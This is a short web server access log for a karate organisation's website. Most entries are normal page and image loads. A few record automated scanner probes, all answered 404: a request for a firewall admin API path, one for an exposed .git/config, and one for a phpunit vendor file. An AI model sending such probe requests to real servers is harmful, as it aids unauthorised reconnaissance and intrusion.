::ffff:35.92.55.87 - - [06/Dec/2022:15:01:46 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.212.236.182 - - [06/Dec/2022:15:06:14 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.212.236.182 - - [06/Dec/2022:15:06:16 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:185.73.125.93 - - [06/Dec/2022:15:08:44 +0000] "GET /api/v2/cmdb/system/admin HTTP/1.1" 404 163 "-" "Report Runner"
::ffff:179.43.177.154 - - [06/Dec/2022:15:10:18 +0000] "GET /wp-content/.git/config HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Linux; Android 12; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
::ffff:12.217.180.0 - - [06/Dec/2022:15:11:30 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1"
::ffff:137.135.225.78 - - [06/Dec/2022:15:11:31 +0000] "GET //vendor/phpunit/phpunit/phpunit.xsd HTTP/1.1" 404 174 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
::ffff:99.105.59.169 - - [06/Dec/2022:15:19:37 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:99.105.59.169 - - [06/Dec/2022:15:19:37 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:99.105.59.169 - - [06/Dec/2022:15:19:37 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:99.105.59.169 - - [06/Dec/2022:15:19:37 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:99.105.59.169 - - [06/Dec/2022:15:19:37 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:99.105.59.169 - - [06/Dec/2022:15:19:37 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
